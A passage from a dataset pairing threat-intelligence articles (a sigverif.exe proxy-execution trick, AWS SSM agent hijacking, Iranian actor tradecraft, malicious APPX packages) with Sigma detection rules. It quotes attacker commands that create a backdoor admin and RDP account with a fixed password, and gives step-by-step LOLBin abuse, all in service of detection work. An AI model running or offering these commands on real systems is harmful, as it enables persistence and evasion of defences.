    "markdown": "# Post\n\nNov 8, 2021\n\nNeed to launch your app unusual way? ;)\n1. Launch Sigverif.exe\n2. Click \"Advanced\"\n3. Type the exe path\n4. Click \"View Log\"\n5. Enjoy ShellExecute()\n\n```image\nDescription: The image shows a graphical user interface with three overlapping windows: the Command Prompt, the Advanced File Signature Verification dialog, and the Calculator application. The Command Prompt indicates that 'sigverif' is being executed in the 'C:\\temp' directory. The File Signature Verification window is open and displays logging options, including the option to save verification results to a log file, with the log file path set to 'C:\\windows\\system32\\calc.exe'. The Calculator window is visible in the foreground, showing a standard mode with the number '0' displayed.\nTranscription: |\n  C:\\temp>sigverif\n  \n  File Signature Verification\n  \n  Logging\n  - Save the file signature verification results to a log file.\n  \n  Logging options\n  - Append to existing log file.\n  - Overwrite existing log file.\n  \n  Log file name:\n  c:\\windows\\system32\\calc.exe\n  \n  [View Log]\n  \n  [Advanced]\n  \n  Calculator\n  Standard\n  0\n```",
    "sigma_rule": {
      "title": "Uncommon Sigverif.EXE Child Process",
      "id": "7d4aaec2-08ed-4430-8b96-28420e030e04",
      "status": "test",
      "description": "Detects uncommon child processes spawning from \"sigverif.exe\", which could indicate potential abuse of the latter as a living of the land binary in order to proxy execution.\n",
      "references": [
        "https://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/",
        "https://twitter.com/0gtweet/status/1457676633809330184"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-19",
      "modified": "2024-08-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1216"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\sigverif.exe"
        },
        "filter_main_werfault": {
          "Image": [
            "C:\\Windows\\System32\\WerFault.exe",
            "C:\\Windows\\SysWOW64\\WerFault.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sigverif_uncommon_child_process.yml",
    "id": "497"
  },
  {
    "url": "https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/",
    "markdown": "# Amazon's AWS SSM agent can be used as post-exploitation RAT malware\n\nAugust 2, 2023\n\nResearchers have discovered a new post-exploitation technique in Amazon Web Services (AWS) that allows hackers to use the platform's System Manager (SSM) agent as an undetectable Remote Access Trojan (RAT).\n\nThe attack concept, devised by security researchers at Mitiga, impacts both Windows and Linux machines and is preferable to using common malware and backdoors as its abuse will less likely be detected by security software.\n\n> \"We strongly believe that threat actors will abuse this in real-world attacks if they do not do so already,\" warns Mitiga in the report.\n\n## Abusing AWS SSM Agent as a RAT\n\nAWS Systems Manager (SSM) is an Amazon-signed binary and comprehensive endpoint management system used by administrators for configuration, patching, and monitoring AWS ecosystems comprising EC2 instances, on-premise servers, or virtual machines.\n\nIt is a very popular tool that comes pre-installed on many popular operating system template images (AMI) that can be used to launch new AWS instances. Therefore, attackers have a large pool of hosts where the new attack surface can be abused, with others previously raising concerns about SSM in 2019 and 2021.\n\nMitiga's discovery is that the SSM agent can be configured to run in \"hybrid\" mode even from within the limits of an EC2 instance, allowing access to assets and servers from attacker-controlled AWS accounts.\n\nWhen configuring SSM to be in hybrid mode, it allows an AWS account to manage non-EC2 machines, including on-premise servers, AWS IoT devices, and virtual machines, including those in other cloud environments.\n\n> \"In our research, we focused on the ability of an SSM agent to run not only on Amazon Elastic Compute Cloud (EC2) instances, but also on non-EC2 machine types (Servers on your own premises and Virtual machines aka VMs, including VMs in other cloud environments),\" explains Mitiga's security advisory.\n\n> \"We abused this feature by registering an SSM agent to run in 'hybrid' mode even if the agent runs on an EC2 instance.\"\n\nAdditionally, bash commands allow the SSM agent to communicate and execute commands using AWS accounts not associated with the compromised EC2 environment. SSM's proxy feature can also be abused to pass network traffic outside any AWS infrastructure.\n\n> \"We found a unique way to abuse the SSM service, allowing it to function seamlessly as a fully integrated trojan infrastructure, making the agent in the endpoint to communicate with different AWS account (which can be used by the attacker) than the original AWS account,\" explains Mitiga.\n\n> \"By executing commands from a separate, maliciously owned AWS account, the actions carried out by the SSM agent will remain hidden within the original AWS account, making the process of detecting the malicious activity cumbersome.\"\n\n```image\nAlt: SSM attack logic diagram\nDescription: The image is a diagram illustrating the attack logic involving the AWS Systems Manager (SSM) agent. It shows two AWS accounts: the 'Victim AWS Account' on the left and the 'Threat Actor AWS Account' on the right. The diagram features two SSM agents within a box representing an EC2 instance in the victim's account. Arrows indicate communication: one arrow points from the SSM agents to the Systems Manager in the victim account, while a red arrow points from the Systems Manager in the threat actor's account to the SSM agents, highlighting the potential for command execution from the threat actor's account to the victim's EC2 instance.\nTranscription: |\n  +-------------------------+                       +-------------------------+\n  |   Victim AWS Account    |                       |   Threat Actor AWS      |\n  |                         |                       |   Account              |\n  |                         |                       |                         |\n  |   Systems Manager       |                       |   Systems Manager       |\n  |                         |                       |                         |\n  |        ↑                |                       |                         |\n  |        |                |                       |                         |\n  |        |                |                       |                         |\n  |   +-----------------+   |                       |                         |\n  |   |     EC2         |   |                       |                         |\n  |   |                 |   |                       |                         |\n  |   |                 |   |                       |                         |\n  |   |   SSM Agent     |   |                       |                         |\n  |   |                 |   |                       |                         |\n  |   |                 |   |                       |                         |\n  |   +-----------------+   |                       |                         |\n  |        ↑                |                       |                         |\n  |        |                |                       |                         |\n  |   +-----------------+   |                       |                         |\n  |   |     SSM Agent   |   |                       |                         |\n  |   +-----------------+   |                       |                         |\n  +-------------------------+                       +-------------------------+\n```\n\n**SSM attack logic diagram**\n*(Mitiga)*\n\nIf hijacking existing SSM agents is unattainable due to a lack of permissions, hackers can run another SSM agent process, which works parallel to any existing processes and gives attackers access to the \"Run Command\" feature.\n\nHowever, the attack is easier to detect in this case as it leaves more traces, and establishing persistence becomes more difficult.\n\nAbusing the SSM agent allows attackers to breach AWS accounts to execute commands remotely without being detected, as the traffic looks like regular activity generated by the agents.\n\n## Defending against this attack\n\nAfter disclosing the post-exploitation method to Amazon, the AWS security team said it's possible to restrict the reception of commands in EC2 instances using the VPC endpoint for Systems Manager, setting the original AWS account or organization as the only approved source.\n\nFurthermore, Mitiga suggests removing the SSM agent from the allow-list of antivirus or EDR solutions and integrating the detection techniques presented in its report into your SIEM and SOAR platforms.\n\n> \"The widespread popularity and initial trust associated with the SSM agent further amplify the need for organizations to take immediate action to mitigate this new technique,\" concludes Mitiga's report.\n\n---\n\n*Update 8/4:*\nAn Amazon spokesperson has sent BleepingComputer the following comment:\n\n> AWS software and systems are behaving as designed and there is no need for customers to take any action.\n\n> The issues described in the Mitiga publication, titled “Mitiga Security Advisory: Abusing the SSM Agent as a Remote Access Trojan,” require an actor to both obtain root level credentials and successfully access an EC2 instance in order to be leveraged.\n\n> As a security best practice, we recommend AWS customers follow our documentation on properly configuring VPC Endpoints with AWS Systems Manager and to use global condition keys for VPC Endpoints and VPC Endpoint Policies to mitigate the risk of inappropriate access to EC2 instances.",
    "sigma_rule": {
      "title": "Potential Amazon SSM Agent Hijacking",
      "id": "d20ee2f4-822c-4827-9e15-41500b1fff10",
      "status": "test",
      "description": "Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.",
      "references": [
        "https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan",
        "https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/",
        "https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/"
      ],
      "author": "Muhammad Faisal",
      "date": "2023-08-02",
      "tags": [
        "attack.command-and-control",
        "attack.persistence",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\amazon-ssm-agent.exe",
          "CommandLine|contains|all": [
            "-register ",
            "-code ",
            "-id ",
            "-region "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate activity of system administrators"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ssm_agent_abuse.yml",
    "id": "508"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/",
    "markdown": "# Evolving trends in Iranian threat actor activity – MSTIC presentation at CyberWarCon 2021\n\n**Research** | **Threat intelligence** | **Threat actors**\n\n**November 16, 2021**\n\n---\n\n### April 2023 update\n\nMicrosoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. Nation-state actors from Iran are now tracked under the name Sandstorm.\n\n- **CURIUM** is now tracked as **Crimson Sandstorm**\n- **EUROPIUM** is now tracked as **Hazel Sandstorm**\n- **PHOSPHORUS** is now tracked as **Mint Sandstorm**\n- **DEV-0343** is now tracked as **Gray Sandstorm**\n\nTo learn more about this evolution, how the new taxonomy represents the origin, unique traits, and impact of threat actors, and a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy.\n\n---\n\nOver the past year, the Microsoft Threat Intelligence Center (MSTIC) has observed a gradual evolution of the tools, techniques, and procedures employed by malicious network operators based in Iran. At CyberWarCon 2021, MSTIC analysts presented their analysis of these trends in Iranian nation-state actor activity during a session titled _“The Iranian evolution: Observed changes in Iranian malicious network operations”_. This blog is intended to summarize the content of that research and the topics covered in their presentation and demonstrate MSTIC’s ongoing efforts to track these actors and protect customers from the related threats.\n\nMSTIC consistently tracks threat actor activity, including the groups discussed in this blog, and works across Microsoft Security products and services to build detections into our products that improve customer protections. We are sharing this blog today so that others in the community can also be aware of the latest techniques we have observed being used by Iranian actors.\n\nAs with any observed nation-state actor activity, Microsoft has directly notified customers that have been targeted or compromised, providing them with the information they need to help secure their accounts. Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing MSTIC to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, a DEV is converted to a named actor.\n\n### Three notable trends in Iranian nation-state operators have emerged:\n\n- They are increasingly utilizing ransomware to either collect funds or disrupt their targets.\n- They are more patient and persistent while engaging with their targets.\n- While Iranian operators are more patient and persistent with their social engineering campaigns, they continue to employ aggressive brute force attacks on their targets.\n\n## Ransomware\n\nSince September 2020, MSTIC has observed six Iranian threat groups deploying ransomware to achieve their strategic objectives. These ransomware deployments were launched in waves every six to eight weeks on average.\n\n```image\nAlt: Timeline of ransomware attacks by Iranian threat actors\nDescription: The image is a timeline illustrating the ransomware attacks conducted by various Iranian threat actors from September 2020 to November 2021. It includes specific names of threat groups, such as DEV-0146 (Thanos), RUBIDIUM, and PHOSPHORUS, along with the months and years when their respective attacks occurred. The timeline visually represents the frequency and evolution of the ransomware activities over the specified period.\nTranscription: |\n  Timeline of ransomware attacks by Iranian threat actors\n  \n  September 2020\n  - DEV-0146 (Thanos)\n  \n  November 2020\n  - RUBIDIUM (pay2key)\n  \n  December 2020\n  - DEV-0227 (Agius)\n  \n  May 2021\n  - RUBIDIUM (n3tw0rm)\n  - PHOSPHORUS\n  \n  August 2021\n  - DEV-0227 (Agius)\n  \n  September 2021\n  - DEV-0198 (Vice Leaker)\n  \n  October 2021\n  - DEV-0500 (Moses Staff)\n  \n  November 2021\n  - PHOSPHORUS\n```\n\n_Figure 1: Timeline of ransomware attacks by Iranian threat actors_\n\nIn one observed campaign, PHOSPHORUS targeted the Fortinet FortiOS SSL VPN and unpatched on-premises Exchange Servers globally with the intent of deploying ransomware on vulnerable networks. A recent blog post by the DFIR Report describes a similar intrusion in which actors leveraged vulnerabilities in on-premise Exchange Servers to compromise a victim environment and encrypt systems via BitLocker. MSTIC also attributes this activity to PHOSPHORUS. PHOSPHORUS operators conducted widespread scanning and ransomed targeted systems through a five-step process: Scan, Exploit, Review, Stage, Ransom.\n\n### Scan\n\nIn the early part of 2021, PHOSPHORUS actors scanned millions of IPs on the internet for Fortinet FortiOS SSL VPN that were vulnerable to CVE-2018-13379. This vulnerability allowed the attackers to collect clear-text credentials from the sessions file on vulnerable Fortinet VPN appliances. The actors collected credentials from over 900 Fortinet VPN servers in the United States, Europe, and Israel so far this year. In the last half of 2021, PHOSPHORUS shifted to scanning for unpatched on-premises Exchange Servers vulnerable to ProxyShell (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065).\n\n### Exploit\n\nWhen they identified vulnerable servers, PHOSPHORUS sought to gain persistence on the target systems. In some instances, the actors downloaded a Plink runner named _MicrosoftOutLookUpdater.exe_. This file would beacon periodically to their C2 servers via SSH, allowing the actors to issue further commands. Later, the actors would download a custom implant via a Base64-encoded PowerShell command. This implant established persistence on the victim system by modifying startup registry keys and ultimately functioned as a loader to download additional tools.\n\n### Review\n\nAfter gaining persistence, PHOSPHORUS actors triaged hundreds of victims to determine which of them were fitting for actions on objectives. On select victims, operators created local administrator accounts with a username of “help” and password of “_AS_@1394” via the commands below. On occasion, actors dumped LSASS to acquire credentials to be used later for lateral movement.\n\n```image\nAlt: Screenshot of code for adding a user\nDescription: The image shows a screenshot of command-line code used to create a local user account named 'help' with the password '_AS_@1394'. It includes three specific commands: the first command adds the user, the second command adds the user to the local administrators group, and the third command adds the user to the 'Remote Desktop Users' group. This code illustrates a method of gaining higher privileges within a compromised system, relevant to the tactics employed by Iranian threat actors.\nTranscription: |\n  net user help _AS_@1394 /add\n  net localgroup administrators help /add\n  net localgroup \"Remote Desktop Users\" help /add\n```\n\n### Stage and Ransom\n\nFinally, MSTIC observed PHOSPHORUS employing BitLocker to encrypt data and ransom victims at several targeted organizations. BitLocker is a full volume encryption feature meant to be used for legitimate purposes. After compromising the initial server (through vulnerable VPN or Exchange Server), the actors moved laterally to a different system on the victim network to gain access to higher value resources. From there, they deployed a script to encrypt the drives on multiple systems. Victims were instructed to reach out to a specific Telegram page to pay for the decryption key.\n\n```image\nAlt: Screenshot of ransom message\nDescription: The image is a screenshot of a ransom message displayed on a victim's system after a ransomware attack. The message states, 'Your drives are Encrypted! Contact us: Telegram: @badguy.' This indicates the attackers' demand for communication via Telegram to negotiate the ransom for decrypting the encrypted files.\nTranscription: |\n  Your drives are Encrypted! Contact us: Telegram: @badguy\n```\n\n## Patience and persistence\n\nMSTIC has observed PHOSPHORUS threat actors employing social engineering to build rapport with their victims before targeting them. These operations likely required significant investment in the operator’s time and resources to refine and execute. This trend indicates PHOSPHORUS is either moving away from or expanding on their past tactics of sending unsolicited links and attachments in spear-phishing email campaigns to attempt credential theft.\n\n### PHOSPHORUS – Patient and persistent\n\nPHOSPHORUS sends “interview requests” to target individuals through emails that contain tracking links to confirm whether the user has opened the file. Once a response is received from the target user, PHOSPHORUS attackers send a link to a benign list of interview questions hosted on a cloud service provider. The attackers continue with several back-and-forth conversations discussing the questions with the target user before finally sending a meeting invite with a link masquerading as a Google Meeting.\n\nOnce the meeting invite is sent, the attackers continuously reach out to the target user, asking them to test the Google Meeting link. The attackers contact the targeted user multiple times per day, continuously pestering them to click the link. The attackers even go so far as to offer to call the target user to walk them through clicking the link. The attackers are more than willing to troubleshoot any issues the user has signing into the fake Google Meeting link, which leads to a credential harvesting page.\n\nMSTIC has observed PHOSPHORUS operators become very aggressive in their emails after the initial lure is sent, to the point where they are almost demanding a response from the targeted user.\n\n### CURIUM – In it for the long run\n\nCURIUM is another Iranian threat actor group that has shown a great deal of patience when targeting users. Instead of phishing emails, CURIUM actors leverage a network of fictitious social media accounts to build trust with targets and deliver malware.\n\nThese attackers have followed the following playbook:\n\n- Masquerade as an attractive woman on social media\n- Establish a connection via social media with a target user via LinkedIn, Facebook, etc.\n- Chat with the target daily\n- Send benign videos of the woman to the target to prime them to lower their guard\n- Send malicious files to the target similar to the benign files previously sent\n- Request that the target user open the malicious document\n- Exfiltrate data from the victim machine\n\nThe process above can take multiple months from the initial connection to the delivery of the malicious document. The attackers build a relationship with target users over time by having constant and continuous communications which allows them to build trust and confidence with the target. In many of the cases we have observed, the targets genuinely believed that they were making a human connection and not interacting with a threat actor operating from Iran.\n\nBy exercising patience, building relationships, and pestering targets continuously once a relationship has been formed, Iranian threat actors have had more success in compromising their targets.\n\n## Brute force\n\nIn 2021, MSTIC observed DEV-0343 aggressively targeting Office 365 tenants via an ongoing campaign of password spray attacks. DEV-0343 is a threat actor MSTIC assesses to be likely operating in support of Iranian interests. MSTIC has blogged about DEV-0343 activity previously.\n\nAnalysis of Office 365 logs suggests that DEV-0343 is using a red team tool like o365spray to conduct these attacks.\n\nTargeting in this DEV-0343 activity has been observed across defense companies that support United States, European Union, and Israeli government partners producing military-grade radars, drone technology, satellite systems, and emergency response communication systems. Further activity has targeted customers in geographic information systems (GIS), spatial analytics, regional ports of entry in the Persian Gulf, and several maritime and cargo transportation companies with a business focus in the Middle East.\n\nAs we discussed in our previous blog, DEV-0343 operators’ ‘pattern of life’ is consistent with the working schedule of actors based in Iran. DEV-0343 operator activity peaked Sunday through Thursday between 04:00:00 and 16:00:00 UTC.\n\n```image\nAlt: DEV-0343 observed operating hours in UTC\nDescription: The image is a bar chart representing the observed requests made by the DEV-0343 threat actor per day over a specific timeframe. The x-axis likely indicates the number of requests, while the y-axis indicates the days of the observation, showing a distribution of activity levels across those days. The data presented in this chart is relevant to understanding the frequency and intensity of DEV-0343's cyber activities.\nTranscription: |\n  [\n      {\n          \"Hour\": \"00\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"01\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"02\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"03\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"04\",\n          \"Requests\": 10000\n      },\n      {\n          \"Hour\": \"05\",\n          \"Requests\": 20000\n      },\n      {\n          \"Hour\": \"06\",\n          \"Requests\": 30000\n      },\n      {\n          \"Hour\": \"07\",\n          \"Requests\": 40000\n      },\n      {\n          \"Hour\": \"08\",\n          \"Requests\": 50000\n      },\n      {\n          \"Hour\": \"09\",\n          \"Requests\": 60000\n      },\n      {\n          \"Hour\": \"10\",\n          \"Requests\": 50000\n      },\n      {\n          \"Hour\": \"11\",\n          \"Requests\": 40000\n      },\n      {\n          \"Hour\": \"12\",\n          \"Requests\": 30000\n      },\n      {\n          \"Hour\": \"13\",\n          \"Requests\": 20000\n      },\n      {\n          \"Hour\": \"14\",\n          \"Requests\": 10000\n      },\n      {\n          \"Hour\": \"15\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"16\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"17\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"18\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"19\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"20\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"21\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"22\",\n          \"Requests\": 0\n      },\n      {\n          \"Hour\": \"23\",\n          \"Requests\": 0\n      }\n  ]\n```\n\n_Figure 2: DEV-0343 observed operating hours in UTC_\n\n```image\nAlt: DEV-0343 observed actor requests per day\nDescription: The image is a horizontal bar chart displaying the observed operating hours of the threat actor DEV-0343 across the days of the week. The y-axis lists the days from Saturday to Sunday, while the x-axis indicates the number of requests made, likely related to password spray attacks targeting Office 365 tenants. The data illustrates a significant peak in activity on Sundays, tapering off through the rest of the week, with notably lower activity on Saturdays and Fridays.\nTranscription: |\n  | Day  | Requests |\n  | ---- | -------- |\n  | Sun  | 160,000  |\n  | Mon  | 100,000  |\n  | Tues | 80,000   |\n  | Wed  | 60,000   |\n  | Thur | 40,000   |\n  | Fri  | 20,000   |\n  | Sat  | 0        |\n```\n\n_Figure 3: DEV-0343 observed actor requests per day_\n\nKnown DEV-0343 operators have also been observed targeting the same account on the same tenant being targeted by other known Iranian operators. For example, EUROPIUM operators attempted to access a specific account on June 12, 2021 and ultimately gained access to this account on June 13, 2021. DEV-0343 was then observed targeting this same account within minutes of EUROPIUM operators gaining access to it the same day. MSTIC assesses that these observed overlapping activities suggest a coordination between different Iranian actors pursuing common objectives.\n\n## Closing thoughts: Increasingly capable threat actors\n\nAs Iranian operators have adapted both their strategic goals and tradecraft, over time they have evolved into more competent threat actors capable of conducting a full spectrum of operations including:\n\n- Information operations\n- Disruption and destruction\n- Support to physical operations\n\nSpecifically, Iranian operators have proven themselves to be both willing and able to:\n\n- Deploy ransomware\n- Deploy disk wipers\n- Deploy mobile malware\n- Conduct phishing attacks\n- Conduct password spray attacks\n- Conduct mass exploitation attacks\n- Conduct supply chain attacks\n- Cloak C2 communications behind legitimate cloud services",
    "sigma_rule": {
      "title": "User Added to Remote Desktop Users Group",
      "id": "ffa28e60-bdb1-46e0-9f82-05f7a61cc06e",
      "related": [
        {
          "id": "ad720b90-25ad-43ff-9b5e-5c841facc8e5",
          "type": "similar"
        },
        {
          "id": "10fb649c-3600-4d37-b1e6-56ea90bb7e09",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects addition of users to the local Remote Desktop Users group via \"Net\" or \"Add-LocalGroupMember\".",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-12-06",
      "modified": "2022-09-09",
      "tags": [
        "attack.persistence",
        "attack.lateral-movement",
        "attack.t1133",
        "attack.t1136.001",
        "attack.t1021.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_main": [
          {
            "CommandLine|contains|all": [
              "localgroup ",
              " /add"
            ]
          },
          {
            "CommandLine|contains|all": [
              "Add-LocalGroupMember ",
              " -Group "
            ]
          }
        ],
        "selection_group": {
          "CommandLine|contains": [
            "Remote Desktop Users",
            "Utilisateurs du Bureau à distance",
            "Usuarios de escritorio remoto"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_add_user_remote_desktop_group.yml",
    "id": "511"
  },
  {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as 